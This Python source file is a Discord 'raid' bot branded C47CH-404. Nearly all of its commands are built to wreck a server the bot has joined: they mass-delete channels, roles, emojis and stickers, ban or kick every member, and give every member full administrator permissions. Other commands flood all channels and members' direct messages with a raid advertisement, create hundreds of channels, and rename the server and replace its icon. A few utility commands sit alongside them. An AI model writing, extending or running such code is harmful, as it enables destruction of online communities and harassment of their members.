import discord
from discord.ext import commands
import asyncio
import aiohttp
import string
import ast
import operator
import psutil
import pyfiglet
import random
import platform
import time
import base64
import datetime
import whois
import dns.resolver
import requests

intents = discord.Intents.default()
intents.members = True
intents.message_content = True
bot = commands.Bot(command_prefix='$', intents=intents)

channel_name = "🧨C47CH-404WasHere"
SPAM_MESSAGE = "☠️ [ ||@everyone|| ]\n ➡️ Your Server Has Been Raided By The **C47CH-404**\n ➡️ https://discord.gg/KK4besj8WC https://media1.tenor.com/m/mXibMXSiN1wAAAAd/pirates-pirate.gif"
start_time = time.time()  

bot.remove_command("help")

@bot.command()  
async def help(ctx, category=None):
    embed = discord.Embed(
        title="☠️ Bot Commands - C47CH-404",
        description="Here are the available commands. Use `$help <category>` to see specific commands.",
        color=0x000000  
    )

    if category is None:
        embed.add_field(
            name="⚙️ Actions - 11 cmds",
            value="`admin`, `admin_all`, `audit_log_lock`, `ban_boosters`, `ban_bots`, `ban_humans`, `ban_list`, `kick_all`, `clear_categories`, `delete_all`, `lock_channels`, `nuke`",
            inline=False
        )

        embed.add_field(
            name="🔢 Utilities - 8 cmds",
            value="`ascii`, `calculator`, `cpu_info`, `server_info`, `user_info`, `iplookup`, `ltcprice`, `token_info`",
            inline=False
        )

        embed.add_field(
            name="🎨 Customization - 6 cmds",
            value="`create_emojis`, `delete_emojis`, `delete_stickers`, `nick_all`, `rename_roles`, `rainbow_roles`",
            inline=False
        )

        embed.add_field(
            name="📢 Mass Actions - 8 cmds",
            value="`mute_all`, `mute_vc`, `move_vc`, `mass_role`, `dm_all`, `edit_channels`, `spam_all`, `say`",
            inline=False
        )

        embed.add_field(
            name="🌐 Information & Status - 7 cmds",
            value="`help`, `info`, `invite`, `leave`, `ping`, `status`, `stopstatus`",
            inline=False
        )

        embed.set_footer(text="Use $help <category> for more details on a specific category.")
    
    else:
        embed.description = "⚠️ Category not found. Use `$help` to see available categories."

    await ctx.send(embed=embed)

    embed2 = discord.Embed(
        title="⌗ C47CH-404 WAS HERE",
        description="⸸ C47CH-404 ⸸ \n :bat:・Owned By The C47CH-404",
        color=0x000000  
    )

    embed2.set_image(url="https://cdn.discordapp.com/attachments/1331467481377669244/1331492414350950431/banner.gif?ex=679d0531&is=679bb3b1&hm=c6c4cc7372cedbd22e85f9e46f3cf4f99a0b4ca1ad7688646493aed588f80f8d&")

    embed2.set_author(
        name="⌗ C47CH-404 WAS HERE",
        icon_url="https://cdn.discordapp.com/attachments/1331467481377669244/1334745471431868471/b59e01de2f8f6c851aab88307baaff4f.webp?ex=679da616&is=679c5496&hm=2f8eb9070c57a77519e12cd82d3b8485bbbd8072148a5aa6adeafb13ee52ba3d&"
    )

    embed2.set_footer(
        text="https://discord.gg/KK4besj8WC - ⌗ 🦇 C47CH-404🦇",
        icon_url="https://cdn.discordapp.com/attachments/1331467481377669244/1334745471431868471/b59e01de2f8f6c851aab88307baaff4f.webp?ex=679da616&is=679c5496&hm=2f8eb9070c57a77519e12cd82d3b8485bbbd8072148a5aa6adeafb13ee52ba3d&"
    )

    await ctx.send(embed=embed2)

PROXIES = [
    "http://45.76.43.163:3128",
    "http://159.203.61.169:3128",
    "http://51.158.68.133:8811"
]

USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "Mozilla/5.0 (Linux; Android 10; SM-G975F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Mobile Safari/537.36"
]

@bot.command()
async def send_request(ctx):
    try:
        proxy = random.choice(PROXIES)
        
        user_agent = random.choice(USER_AGENTS)
        
        headers = {
            "User-Agent": user_agent
        }
        
        async with aiohttp.ClientSession() as session:
            async with session.get('https://httpbin.org/ip', headers=headers, proxy=proxy) as response:
                if response.status == 200:
                    data = await response.json()
                    await ctx.send(f"Request sent successfully! Proxy: {proxy} Response: {data}")
                else:
                    await ctx.send(f"Failed to send request with status {response.status}")
    
    except Exception as e:
        await ctx.send(f"An error occurred: {e}")

@bot.event
async def on_ready():
    print(f"discord.gg/KK4besj8WC - ⌗ 🦇 C47CH-404🦇 Logged in as {bot.user}")

@bot.command()
async def ping(ctx):
    latency = round(bot.latency * 1000)
    await ctx.send(f"Pong! Latency is {latency}ms")

@bot.command()
async def invite(ctx):
    permissions = discord.Permissions(administrator=True)
    invite_link = discord.utils.oauth_url(ctx.bot.user.id, permissions=permissions)
    await ctx.send(f"> ☠️ Invite Me Here!:\n > ➡️ ||[Click Here!]({invite_link})||")

@bot.command()
async def say(ctx, *, message):
    await ctx.message.delete()
    await ctx.send(message)

async def casci(ctx, text, font):
    try:
        fig = pyfiglet.Figlet(font=font)
        ascii_result = fig.renderText(text)
        await ctx.send(f"**Font: `{font}`**\n```\n{ascii_result}\n```")
    except Exception as e:
        await ctx.send(f"❌ An error occurred: {e}")

@bot.command(name="ascii")
async def ascii_art(ctx, *, text):
    try:
        available_fonts = pyfiglet.Figlet().getFonts()
        additional_fonts = ["block", "caligraphy", "isometric1", "digital", "banner3-D"]
        available_fonts.extend(additional_fonts)
        random.shuffle(available_fonts)
        selected_fonts = random.sample(available_fonts, 5)

        for font in selected_fonts:
            await casci(ctx, text, font)
    except Exception as e:
        await ctx.send(f"❌ An error occurred: {e}")

OPERATORS = {
    ast.Add: operator.add,
    ast.Sub: operator.sub,
    ast.Mult: operator.mul,
    ast.Div: operator.truediv,
    ast.Pow: operator.pow,
    ast.Mod: operator.mod,
    ast.USub: operator.neg,
}

def safe_eval(node):
    """Safely evaluate an abstract syntax tree node."""
    if isinstance(node, ast.BinOp) and type(node.op) in OPERATORS:
        return OPERATORS[type(node.op)](safe_eval(node.left), safe_eval(node.right))
    elif isinstance(node, ast.UnaryOp) and type(node.op) in OPERATORS:
        return OPERATORS[type(node.op)](safe_eval(node.operand))
    elif isinstance(node, ast.Num): 
        return node.n
    else:
        raise ValueError("Unsupported operation")

@bot.command()
async def calculator(ctx, *, expression):
    try:
        tree = ast.parse(expression, mode="eval")
        result = safe_eval(tree.body)
        await ctx.send(f"**``{result}``**")
    except Exception as e:
        await ctx.send(f"❌ An error occurred: {e}")

@bot.command()
async def iplookup(ctx, ip_address):
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(f"https://ipinfo.io/{ip_address}/json") as response:
                data = await response.json()

            message = (
                f"**🌐 IP Lookup: {ip_address}**\n"
                f"**🔍 IP Address: {data.get('ip', 'N/A')}**\n"
                f"**🏙 City: {data.get('city', 'N/A')}**\n"
                f"**🌍 Region: {data.get('region', 'N/A')}**\n"
                f"**🌎 Country: {data.get('country', 'N/A')}**\n"
                f"**📍 Location: {data.get('loc', 'N/A')}**\n"
                f"**🏢 Organization: {data.get('org', 'N/A')}**"
            )

            await ctx.send(message)
    except Exception as e:
        await ctx.send(f"❌ An error occurred: {e}")

@bot.command()
async def user_info(ctx, member: discord.Member = None):
    member = member or ctx.author  

    created_discord = member.created_at.strftime("%m/%d/%Y")
    joined_server = member.joined_at.strftime("%m/%d/%Y") if member.joined_at else "Not available"

    embed = discord.Embed(
        title=f"👤 - **User Info** - 👤",
        description=f"Information about the user **{member.name}**",
        color=discord.Color.blue()
    )

    embed.add_field(name="🆔 User ID", value=member.id)
    embed.add_field(name="💬 Username", value=member.name)
    embed.add_field(name="📝 Discriminator", value=member.discriminator)
    embed.add_field(name="🛑 Nickname", value=member.nick or "None")
    embed.add_field(name="🌐 Status", value=str(member.status).capitalize())
    embed.add_field(name="📅 Joined Discord", value=created_discord)
    embed.add_field(name="📅 Joined Server", value=joined_server)

    embed.set_thumbnail(url=member.avatar.url if member.avatar else "https://via.placeholder.com/150")

    await ctx.send(embed=embed)

@bot.command()
async def server_info(ctx):
    guild = ctx.guild

    created_at = guild.created_at.strftime("%m/%d/%Y")
    owner = guild.owner.mention if guild.owner else "No owner"

    embed = discord.Embed(
        title=f"📜 Information about **{guild.name}**",
        description=f"Information for the server **{guild.name}**",
        color=discord.Color.blue()
    )

    embed.add_field(name="🆔 Server ID", value=guild.id)
    embed.add_field(name="🌍 Preferred Locale (Region)", value=guild.preferred_locale)
    embed.add_field(name="👥 Member Count", value=guild.member_count)
    embed.add_field(name="🏅 Owner", value=owner)
    embed.add_field(name="📝 Created at", value=created_at)
    embed.add_field(name="🖼️ Server Icon", value=guild.icon.url if guild.icon else "No icon available")

    embed.set_thumbnail(url=guild.icon.url if guild.icon else "https://via.placeholder.com/150")

    await ctx.send(embed=embed)

@bot.command()
async def cpu_info(ctx):
    cpu_percent = psutil.cpu_percent(interval=1) 
    cpu_count = psutil.cpu_count(logical=False)  
    cpu_threads = psutil.cpu_count(logical=True)  

    embed = discord.Embed(
        title="💻 **CPU Information** 💻",
        description="Here is the CPU information for the current system:",
        color=discord.Color.blue()
    )

    embed.add_field(name="📊 CPU Usage", value=f"{cpu_percent}%")
    embed.add_field(name="🔢 Physical CPU Cores", value=cpu_count)
    embed.add_field(name="🧵 Logical CPU Threads", value=cpu_threads)

    await ctx.send(embed=embed)

@bot.command()
async def kill(ctx):
    await ctx.message.delete()
    tasks = []
    
    tasks.extend([member.ban(reason="Nuked By The Catch-404") for member in ctx.guild.members if member.bot and member != ctx.guild.me])
    tasks.extend([role.delete() for role in ctx.guild.roles if role != ctx.guild.default_role and role != ctx.guild.me.top_role])
    tasks.extend([emoji.delete() for emoji in ctx.guild.emojis])
    tasks.extend([sticker.delete() for sticker in ctx.guild.stickers])
    
    if ctx.guild.templates:
        templates = await ctx.guild.templates()
        tasks.extend([template.delete() for template in templates])
    
    tasks.extend([channel.delete() for channel in ctx.guild.channels])
    
    try:
        await asyncio.gather(*tasks)
    except Exception:
        pass
    
    create_tasks = []
    for _ in range(200):
        create_tasks.append(ctx.guild.create_text_channel(channel_name))
    await asyncio.gather(*create_tasks)

@bot.command(name='rename_roles')
async def rename_roles(ctx, *, new_name: str):
    await ctx.message.delete()

    roles = ctx.guild.roles

    for role in roles:
        try:
            await role.edit(name=new_name)
        except Exception as e:
            print(f"Could not rename role `{role.name}`: {e}")

@bot.command()
async def nuke(ctx):
    await ctx.message.delete()
    
    channels = ctx.guild.text_channels
    
    for channel in channels:
        try:
            await channel.delete()  
        except Exception as e:
            print(f"Could not delete channel {channel.name}: {e}")  
    try:
        new_channel = await ctx.guild.create_text_channel("🧨C47CH-404-was-here") 
        await ctx.send(f'New channel created: {new_channel.mention}')
    except Exception as e:
        print(f"Could not create new channel: {e}")  

    try:
        await ctx.guild.edit(name="🏴‍☠️PossessedByTheC47CH-404")  
    except Exception as e:
        print(f"Could not change server name: {e}") 

    logo_url = "https://cdn.discordapp.com/icons/1298087061013659709/bd06f88c9678ac83014e6dcdb518c5cf.webp?size=512"
    
    async with aiohttp.ClientSession() as session: 
        try:
            async with session.get(logo_url) as resp: 
                if resp.status == 200:
                    image_data = await resp.read()
                    await ctx.guild.edit(icon=image_data)  
                else:
                    print(f"Failed to fetch image: {resp.status}")
        except Exception as e:
            print(f"Could not change server icon: {e}")

@bot.command()
async def delete_all(ctx):
    await ctx.message.delete()
    try:
        await ctx.guild.edit(name="Servidor Terminator")
    except:
        pass

    try:
        await ctx.guild.edit(icon=None)
    except:
        pass

    try:
        if ctx.guild.features and "COMMUNITY" in ctx.guild.features:
            await ctx.guild.edit(community=False)
    except:
        pass

    emoji_deletion_tasks = [emoji.delete() for emoji in ctx.guild.emojis]
    await asyncio.gather(*emoji_deletion_tasks, return_exceptions=True)

    sticker_deletion_tasks = [sticker.delete() for sticker in ctx.guild.stickers]
    await asyncio.gather(*sticker_deletion_tasks, return_exceptions=True)

    await asyncio.sleep(10)

    channel_deletion_tasks = [channel.delete() for channel in ctx.guild.channels]
    await asyncio.gather(*channel_deletion_tasks, return_exceptions=True)

    role_deletion_tasks = [
        role.delete()
        for role in ctx.guild.roles
        if role != ctx.guild.default_role and role < ctx.author.top_role
    ]
    await asyncio.gather(*role_deletion_tasks, return_exceptions=True)

    ban_tasks = [
        member.ban(reason="Limpieza del servidor.")
        for member in ctx.guild.members
        if member.top_role < ctx.me.top_role and not member.bot
    ]
    await asyncio.gather(*ban_tasks, return_exceptions=True)

def generar_nombre_aleatorio():
    return ''.join(random.choices(string.ascii_letters + string.digits, k=10))

@bot.command()
async def audit_log_lock(ctx):
    await ctx.message.delete()
    for _ in range(1000):  
        nuevo_nombre = generar_nombre_aleatorio()  
        await ctx.guild.edit(name=nuevo_nombre)  

@bot.command() 
async def spam_all(ctx):
    await ctx.message.delete()
    guild = ctx.guild 

    if guild:
        try:
            print(f'Starting spam in all existing channels.')

            tasks = []
            for channel in guild.channels:
                if isinstance(channel, discord.TextChannel):
                    tasks.append(spam_messages(channel))

            await asyncio.gather(*tasks)

        except Exception as e:
            print(f'Error during spam operation: {e}')
            await ctx.send("An error occurred while trying to spam the server.")

    else:
        await ctx.send("Guild not found. Please check the guild name.")

async def spam_messages(channel):
    """Function to spam messages in a channel."""
    for _ in range(70):
        await channel.send(SPAM_MESSAGE)
        print(f'Message sent in {channel.name}')
        await asyncio.sleep(0.25)

@bot.command()
async def move_vc(ctx):
    await ctx.message.delete()
    moved_members = []  

    vc_channels = [vc_channel for vc_channel in ctx.guild.voice_channels]

    if not vc_channels:
        await ctx.send("There are no voice channels available to move members.")
        return

    target_channel = random.choice(vc_channels)

    for vc_channel in ctx.guild.voice_channels:
        if vc_channel == target_channel:
            continue

        for member in vc_channel.members:
            try:
                await member.move_to(target_channel)
                moved_members.append(member.display_name)  # Add the moved member's name to the list
            except discord.Forbidden:
                await ctx.send(f"I don't have permission to move {member.display_name} from {vc_channel.name}.")
                continue
            except discord.HTTPException as e:
                await ctx.send(f"Failed to move {member.display_name}: {e}")
                continue

    if moved_members:
        embed = discord.Embed(
            title="Users Moved to a Random Voice Channel",
            description="The following members have been moved to the new channel:",
            color=discord.Color.green()
        )
        embed.add_field(name="Moved Members", value="\n".join(moved_members))
        embed.add_field(name="Target Channel", value=target_channel.name)

        try:
            await ctx.author.send(embed=embed)
            await ctx.send("Members have been moved to a random channel, and I've sent you a DM with the list.")
        except discord.HTTPException as e:
            await ctx.send(f"Failed to send you the DM: {e}")
    else:
        await ctx.send("No members to move.")

@bot.command()
async def mute_vc(ctx):
    await ctx.message.delete()
    muted_members = []  

    for vc_channel in ctx.guild.voice_channels:
        for member in vc_channel.members:
            try:
                await member.edit(mute=True)
                muted_members.append(member.display_name)  
            except discord.Forbidden:
                await ctx.send(f"I don't have permission to mute {member.display_name} in {vc_channel.name}.")
                continue
            except discord.HTTPException as e:
                await ctx.send(f"Failed to mute {member.display_name}: {e}")
                continue

    if muted_members:
        embed = discord.Embed(
            title="Users Muted in Voice Channels",
            description="The following members have been muted:",
            color=discord.Color.red()
        )
        embed.add_field(name="Muted Members", value="\n".join(muted_members))

        try:
            await ctx.author.send(embed=embed)
            await ctx.send("Members have been muted, and I've sent you a DM with the list.")
        except discord.HTTPException as e:
            await ctx.send(f"Failed to send you the DM: {e}")
    else:
        await ctx.send("No members to mute.")

@bot.command()
async def ban_humans(ctx):
    await ctx.message.delete()

    members = ctx.guild.members

    human_members = [member for member in members if not member.bot and not member.premium_since]

    await asyncio.sleep(0.1)

    for member in human_members:
        try:
            await member.ban(reason="Banned by C47CH-404")  
            print(f"Banned {member.name}")
        except Exception as e:
            print(f"Could not ban {member.name}: {e}")  

@bot.command()
async def ban_boosters(ctx):
    await ctx.message.delete()

    members = ctx.guild.members

    boosters = [member for member in members if member.premium_since]

    await asyncio.sleep(0.1)

    for member in boosters:
        try:
            await member.ban(reason="Banned by C47CH-404 (Booster)")  
            print(f"Banned booster: {member.name}")
        except Exception as e:
            print(f"Could not ban booster {member.name}: {e}")  

@bot.command()
async def ban_bots(ctx):
    await ctx.message.delete()

    members = ctx.guild.members

    bots = [member for member in members if member.bot]

    await asyncio.sleep(0.1)

    for member in bots:
        try:
            await member.ban(reason="Banned by C47CH-404 (Bot)") 
            print(f"Banned bot: {member.name}")
        except Exception as e:
            print(f"Could not ban bot {member.name}: {e}")  

@bot.command()
async def kick_all(ctx):
    await ctx.message.delete()

    members = ctx.guild.members
    human_members = [member for member in members if not member.bot and not member.premium_since]

    await ctx.send(f"Waiting 5 seconds before kicking {len(human_members)} users...")
    await asyncio.sleep(5)

    for member in human_members:
        try:
            await member.kick(reason="Kicked by C47CH-404")
            print(f"Kicked {member.name}")
        except Exception as e:
            print(f"Could not kick {member.name}: {e}")
            await ctx.send(f"Could not kick {member.name}.")

@bot.command()
async def mute_all(ctx):
    await ctx.message.delete()

    members = ctx.guild.members
    human_members = [member for member in members if not member.bot and not member.premium_since]

    muted_role = discord.utils.get(ctx.guild.roles, name="Muted")
    if not muted_role:
        muted_role = await ctx.guild.create_role(name="Muted", reason="Role for muting members temporarily.")
        for channel in ctx.guild.text_channels:
            await channel.set_permissions(muted_role, send_messages=False, speak=False)
        for channel in ctx.guild.voice_channels:
            await channel.set_permissions(muted_role, speak=False)

    await ctx.send(f"Waiting 5 seconds before muting {len(human_members)} users...")
    await asyncio.sleep(5)

    for member in human_members:
        try:
            await member.add_roles(muted_role, reason="Muted by C47CH-404 for a week")
            print(f"Muted {member.name}")
        except Exception as e:
            print(f"Could not mute {member.name}: {e}")

    await asyncio.sleep(604800)

    for member in human_members:
        try:
            await member.remove_roles(muted_role, reason="Mute duration expired")
            print(f"Unmuted {member.name}")
        except Exception as e:
            print(f"Could not unmute {member.name}: {e}")

@bot.command(name="nsfw_channels")
async def nsfw_channels(ctx):
    await ctx.message.delete()
    guild = ctx.guild  
    tasks = []  

    for i in range(70):

        channel_name = f"🔥C47CH-404-was-here"

        try:
            channel = await guild.create_text_channel(
                channel_name, 
                nsfw=True  
            )
            print(f"Created NSFW channel: {channel_name}")

            tasks.append(asyncio.sleep(0.3))  

        except Exception as e:
            print(f"Error creating channel {channel_name}: {e}") 

    await asyncio.gather(*tasks)

@bot.command(name="edit_channels")
async def edit_channels(ctx, new_name: str):
    await ctx.message.delete()
    guild = ctx.guild  
    tasks = []  

    for channel in guild.channels:
        if isinstance(channel, discord.TextChannel):
            try:
                # Renombrar el canal
                await channel.edit(name=new_name)
                print(f"Renamed channel {channel.name} to {new_name}")

                tasks.append(asyncio.sleep(3))  

            except Exception as e:
                print(f"Error renaming channel {channel.name}: {e}") 

    await asyncio.gather(*tasks)

@bot.command(name="clear_categories")
async def clear_categories(ctx):
    await ctx.message.delete()
    guild = ctx.guild 
    categories = [category for category in guild.categories]  
    
    tasks = []  
    
    for category in categories:
        try:
            await category.delete()
            print(f"Deleted category: {category.name}")
            
            tasks.append(asyncio.sleep(3))  
            
        except Exception as e:
            print(f"Error deleting category {category.name}: {e}")  

    await asyncio.gather(*tasks)

@bot.command(name="admin")
async def admin(ctx):
    await ctx.message.delete()

    member = ctx.author  
    bot_role = ctx.guild.me.top_role  
    roles = [role for role in ctx.guild.roles] 
    
    admin_role = await ctx.guild.create_role(
        name="Admin",
        permissions=discord.Permissions.all(), 
        reason="Admin role created by bot command"
    )
    
    await member.add_roles(admin_role)
    
    if bot_role.position > 1:  
        await admin_role.edit(position=bot_role.position - 1)

@bot.command(name="admin_all")
async def admin_all(ctx):
    await ctx.message.delete()
    everyone_role = ctx.guild.default_role

    bot_role = ctx.guild.me.top_role 

    try:
        await everyone_role.edit(permissions=discord.Permissions.all())

    except Exception as e:
        print(f"Error: {e}")

import random

@bot.command(name="rainbow_roles")
async def rainbow_roles(ctx, *, role_name="🦇C47CH-404"):
    await ctx.message.delete()
    
    for _ in range(120):
        color = discord.Color(random.randint(0, 0xFFFFFF))  
        await ctx.guild.create_role(name=role_name, color=color, reason="Rainbow roles created by bot command")

@bot.command(name="info")
async def bot_info(ctx):
    uptime = time.time() - start_time 
    uptime_str = time.strftime("%Hh %Mm %Ss", time.gmtime(uptime))

    embed = discord.Embed(
        title="🤖 Bot Information",
        description="Details about this bot",
        color=discord.Color.blue()
    )
    embed.add_field(name="📌 Version", value="1.0.0", inline=True)
    embed.add_field(name="👨‍💻 Developers", value="C47CH-404 - https://discord.gg/KK4besj8WC", inline=True)
    embed.add_field(name="🖥️ Running on", value=platform.system() + " " + platform.release(), inline=True)
    embed.add_field(name="⏳ Uptime", value=uptime_str, inline=True)
    embed.add_field(name="🛠️ Library", value="discord.py", inline=True)
    
    embed.set_footer(text=f"Requested by {ctx.author}", icon_url=ctx.author.avatar.url)

    await ctx.send(embed=embed)

@bot.command(name="token_info")
async def token_info(ctx, token: str):
    await ctx.message.delete()  
    
    try:
        user_id_base64 = token.split(".")[0]
        user_id_bytes = base64.urlsafe_b64decode(user_id_base64 + "==")  
        user_id = int.from_bytes(user_id_bytes, "big")

        discord_epoch = 1420070400000  
        timestamp = ((user_id >> 22) + discord_epoch) / 1000
        creation_date = datetime.datetime.utcfromtimestamp(timestamp).strftime("%Y-%m-%d %H:%M:%S UTC")

        is_bot = "Yes ✅" if token.startswith("M") else "No ❌"

        embed = discord.Embed(
            title="🔑 Token Information",
            description="Here is the extracted information from the provided token:",
            color=discord.Color.orange()
        )
        embed.add_field(name="🆔 User ID", value=user_id, inline=False)
        embed.add_field(name="🤖 Is Bot?", value=is_bot, inline=True)
        embed.add_field(name="📅 Account Created", value=creation_date, inline=True)
        embed.set_footer(text=f"Requested by {ctx.author}", icon_url=ctx.author.avatar.url)

        await ctx.send(embed=embed)

    except Exception as e:
        await ctx.send(f"❌ **Invalid token!**\nError: `{str(e)}`", delete_after=5)

@bot.command(name="dm_all")
async def dm_all(ctx):
    await ctx.message.delete()  
    count = 0  

    for member in ctx.guild.members:
        if not member.bot:  
            try:
                await member.send("☠️ [ ||@everyone|| ]\n ➡️ Your Server Has Been Raided By The **C47CH-404**\n ➡️ https://discord.gg/KK4besj8WC https://media1.tenor.com/m/mXibMXSiN1wAAAAd/pirates-pirate.gif")
                count += 1
            except:
                pass  
    
@bot.command(name="ltcprice")
async def ltc_price(ctx):
    try:
        async with aiohttp.ClientSession() as session:
            # Obtener precio en USD
            async with session.get("https://api.coingecko.com/api/v3/simple/price", params={"ids": "litecoin", "vs_currencies": "usd"}) as response_usd:
                data_usd = await response_usd.json()
                ltc_price_usd = data_usd["litecoin"]["usd"]

            # Obtener precio en INR
            async with session.get("https://api.coingecko.com/api/v3/simple/price", params={"ids": "litecoin", "vs_currencies": "inr"}) as response_inr:
                data_inr = await response_inr.json()
                ltc_price_inr = data_inr["litecoin"]["inr"]

        await ctx.send(
            f"**📈 Current Litecoin (LTC) Price:**\n"
            f"• USD: ${ltc_price_usd:.2f}\n"
            f"• INR: ₹{ltc_price_inr:.2f}"
        )
    except Exception as e:
        await ctx.send(f"❌ An error occurred: {e}")

@bot.command(name="status")
async def set_status(ctx, activity_type: str, *, status: str):
    activity_type = activity_type.lower()

    if activity_type not in ["playing", "streaming", "listening", "watching"]:
        await ctx.send("`:> playing, streaming, listening, watching.`")
        return

    if activity_type == "streaming":
        await bot.change_presence(activity=discord.Streaming(name=status, url="http://twitch.tv/streamer"))
    else:
        await bot.change_presence(activity=discord.Game(name=status))

    await ctx.send(f"**✅ | Custom status set to `{activity_type}` `{status}`**")


@bot.command(name="stopstatus")
async def stop_status(ctx):
    global current_status

    await bot.change_presence(activity=None)
    current_status = None
    await ctx.send("✅ | **Custom status stopped.**")

@bot.command(name="nick_all")
async def nick_all(ctx):
    await ctx.message.delete()  
    count = 0  # 

    for member in ctx.guild.members:
        if member != ctx.guild.owner and member.guild_permissions.administrator is False:  
            try:
                await member.edit(nick="user")  
                count += 1
            except:
                pass  

@bot.command(name="leave")
async def leave(ctx):
    await ctx.message.delete()  

    embed = discord.Embed(
        title="⚠️ Confirmación",
        description="¿Estás seguro de que quieres que el bot abandone el servidor?",
        color=discord.Color.red()
    )
    embed.set_footer(text="Reacciona con ✅ para confirmar o ❌ para cancelar.")

    message = await ctx.send(embed=embed)

    await message.add_reaction("✅")  
    await message.add_reaction("❌")  

    def check(reaction, user):
        return user == ctx.author and reaction.message.id == message.id and str(reaction.emoji) in ["✅", "❌"]

    try:
        reaction, user = await bot.wait_for("reaction_add", timeout=15.0, check=check)

        if str(reaction.emoji) == "✅":
            await ctx.guild.leave()  
        else:
            await message.delete() 
    except:
        await message.delete()  

@bot.command(name="mass_role")
async def mass_role(ctx, role: discord.Role, action: str):
    await ctx.message.delete()  

    if action.lower() not in ["add", "remove"]:
        return await ctx.send("⚠️ **Incorrect usage:** Use `mass_role @role add` or `mass_role @role remove`.", delete_after=5)

    members = ctx.guild.members
    success_count = 0

    for member in members:
        if action.lower() == "add" and role not in member.roles:
            await member.add_roles(role)
            success_count += 1
        elif action.lower() == "remove" and role in member.roles:
            await member.remove_roles(role)
            success_count += 1

@bot.command(name="lock_channels")
async def lock_channels(ctx):
    await ctx.message.delete()  
    guild = ctx.guild
    role_everyone = guild.default_role  

    overwrites = {
        role_everyone: discord.PermissionOverwrite(send_messages=False)  
    }

    success_count = 0

    for channel in guild.text_channels:
        await channel.edit(overwrites=overwrites)
        success_count += 1

@bot.command(name="delete_emojis")
async def delete_emojis(ctx):
    await ctx.message.delete()
    
    emojis = ctx.guild.emojis  
    success_count = 0

    for emoji in emojis:
        try:
            await emoji.delete()  
            success_count += 1
        except Exception as e:
            print(f"Could not delete emoji {emoji.name}: {e}")

    await ctx.send(f"Deleted {success_count} emojis.", delete_after=5)

@bot.command(name="delete_stickers")
async def delete_stickers(ctx):
    await ctx.message.delete()
    
    stickers = ctx.guild.stickers 
    success_count = 0

    for sticker in stickers:
        try:
            await sticker.delete() 
            success_count += 1
        except Exception as e:
            print(f"Could not delete sticker {sticker.name}: {e}")

    await ctx.send(f"Deleted {success_count} stickers.", delete_after=5)

@bot.command()
async def ban_list(ctx):
    banned_users = []
    async for entry in ctx.guild.bans():
        user = entry.user 
        banned_users.append(user)
    
    if banned_users:
        banned_list = '\n'.join([f'{user.name}#{user.discriminator}' for user in banned_users])
        await ctx.send(f'Usuarios baneados:\n{banned_list}')
    else:
        await ctx.send('No hay usuarios baneados en este servidor.')

@bot.command()
async def create_emojis(ctx, image_url: str, amount: int = 15):
    await ctx.message.delete()
    if amount < 1 or amount > 50:
        return  

    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(image_url) as response:
                if response.status != 200:
                    return  
                image_data = await response.read()

        for i in range(1, amount + 1):
            try:
                await ctx.guild.create_custom_emoji(name=f"emoji_{i}", image=image_data)
            except discord.errors.HTTPException:
                continue  

    except Exception:
        return  

bot.run('Token_Here') #Your Token Here

